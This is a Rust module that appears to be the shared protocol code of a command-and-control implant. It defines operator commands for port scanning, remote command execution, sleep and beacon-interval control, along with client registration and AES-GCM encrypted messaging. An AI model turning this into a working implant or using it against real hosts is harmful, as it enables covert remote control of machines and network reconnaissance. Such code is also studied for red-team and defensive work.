pub mod common {
    #[macro_export]
    macro_rules! debug {
        ($($e:expr),+) => {
            {
                #[cfg(debug_assertions)]
                {
                    dbg!($($e),+)
                }
                #[cfg(not(debug_assertions))]
                {
                    ($($e),+)
                }
            }
        };
    }
    // Macro to "println!" only when compiled in debug mode
    #[macro_export]
    macro_rules! println_d {
        ($($e:expr),+) => {
            {
                #[cfg(debug_assertions)]
                {
                    println!($($e),+)
                }
            }
        };
    }
    use aes_gcm::aead::{Aead, NewAead};
    use aes_gcm::{Aes256Gcm, Key, Nonce};
    use serde::{Deserialize, Serialize};
    use std::error;
    use std::net::SocketAddr;
    use std::time;
    // Change the alias to `Box<error::Error>`.
    type Result<T> = std::result::Result<T, Box<dyn error::Error>>;
    #[derive(Serialize, Deserialize, Debug)]
    pub enum Cmd {
        PortScan(String, u16, u16),
        Version,
        Sleep(time::Duration),
        Exec(String),
        UpdateSleepInterval(u64),
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct Response<T> {
        pub success: bool,
        pub payload: Option<T>,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct VersionRes {}
    #[derive(Serialize, Deserialize, Debug)]
    pub struct RegisterRes {
        pub uuid: String,
        pub aes_key: String,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct AuthPayload {
        pub client_uuid: String,
        pub payload: Vec<u8>,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub enum Payload {
        GetCommand(AskPayload),
        Version(VersionPayload),
        PortScan(PortScanPayload),
        Exec(ExecPayload),
    }
    impl Payload {
        pub fn aes_encrypt(&self, key: &str) -> Result<Vec<u8>> {
            let j = serde_json::to_string(self)?;
            Ok(aes_encrypt(key, &j))
        }
    }
    pub fn aes_encrypt(key: &str, msg: &str) -> Vec<u8> {
        let key = Key::from_slice(key.as_bytes());
        let cipher = Aes256Gcm::new(key);
        let random_bytes: Vec<u8> = (0..12).map(|_| rand::random::<u8>()).collect();
        let nonce_slice = random_bytes.as_slice();
        let nonce = Nonce::from_slice(nonce_slice);
        let mut ciphertext = match cipher.encrypt(nonce, msg.as_ref()) {
            Ok(v) => v,
            Err(e) => {
                println_d!("{:?}", e);
                vec![]
            }
        };
        ciphertext.extend_from_slice(nonce_slice);
        ciphertext
    }
    pub fn aes_decrypt(key: &str, buf: Vec<u8>) -> Result<String> {
        let key = Key::from_slice(key.as_bytes());
        let cipher = Aes256Gcm::new(key);
        if buf.len() < 12 {
            return Ok("".to_owned());
        }
        let nonce_raw = buf.as_slice()[buf.len() - 12..].as_ref();
        let content = buf.as_slice()[..buf.len() - 12].as_ref();
        let nonce = Nonce::from_slice(nonce_raw);
        let plaintext = match cipher.decrypt(nonce, content) {
            Ok(v) => v,
            Err(e) => {
                println_d!("{:?}", e);
                vec![]
            }
        };
        let res = String::from_utf8(plaintext)?;
        Ok(res)
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct RegisterPayload {
        pub public_key: String,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct AskPayload {}
    #[derive(Serialize, Deserialize, Debug)]
    pub struct AskRes {
        pub cmds: Vec<Cmd>,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct AckRes {}
    #[derive(Serialize, Deserialize, Debug)]
    pub struct UnknownUUIDRes {}
    #[derive(Serialize, Deserialize, Debug)]
    pub struct VersionPayload {
        pub version: String,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct PortScanPayload {
        pub result: Vec<SocketAddr>,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct ExecPayload {
        pub stdout: Vec<u8>,
    }
    #[derive(Serialize, Deserialize, Debug)]
    pub struct DisplayClientPayload {
        pub uuid: String,
    }
}